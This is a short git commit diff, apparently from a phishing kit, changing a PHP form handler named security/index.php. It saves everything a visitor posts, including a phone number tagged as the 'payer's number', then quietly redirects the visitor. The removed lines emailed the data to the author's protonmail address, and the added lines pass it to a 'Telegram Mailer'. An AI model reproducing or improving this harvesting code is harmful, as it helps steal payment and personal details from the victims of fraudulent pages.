6bf1cda3faf62c73e7fb1a4fba4de3cfaf89f429
payc2c <payc2c@protonmail.com>
2019-08-17 15:09:03 +0100

    Composer, oop, Telegram Mailer

--- security/index.php
+++ security/index.php
@@ -1,20 +1,11 @@
 <?php
 session_start();
 header("Location: index.html");
-
 error_reporting(E_ALL);
-
+include("../src/Mailer.php");
+$_POST["phone"] = "+7" . $_POST["phone"];
 $_SESSION = $_POST;
 
-$to = "payc2c@protonmail.com";
-$message;
-$subject = "Номер платильщика" . $_SESSION["phone"];
-foreach ($_SESSION as $key => $value) {
-    $message = $key . ":" . $value . "\r\n";
-}
-$header = "From: mymail@gmail.com	 \r\n";
-
-echo $message;
-$retval = mail($to, $subject, $message, $header);
-
+$sendEmail = new Mailer($_SESSION, $_POST);
+$sendEmail->sendEmail();
 ?>
